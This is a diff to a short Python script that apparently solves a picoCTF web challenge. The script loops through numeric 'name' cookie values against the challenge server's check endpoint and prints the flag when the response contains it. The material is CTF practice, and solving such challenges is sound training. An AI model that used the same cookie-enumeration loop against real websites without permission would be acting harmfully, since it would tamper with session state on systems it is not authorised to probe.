@@ -16,14 +16,14 @@ import re
 s = requests.Session()
 
 # Let's automate this
-count = 0
-
-while count < 30:
+for i in range(25):
+    cookie = 'name={}'.format(i)
+    headers = {'Cookie':cookie}
     url = "http://mercury.picoctf.net:54219/check"
-    cookies = {'name': '{count}'}
-    r = requests.get(url, cookies=cookies)
-    search = re.search('picoCTF', r.text)
-    print(f"Cookie value: {count}", search)
-    count += 1
+    r = requests.get(url, headers=headers)
+    print("Cookie value = ", i)
+    if (r.status_code == 200) and ('picoCTF' in r.text):
+        print("Found flag at cookie value ", i)
+        print(r.text)   
 
 s.close()
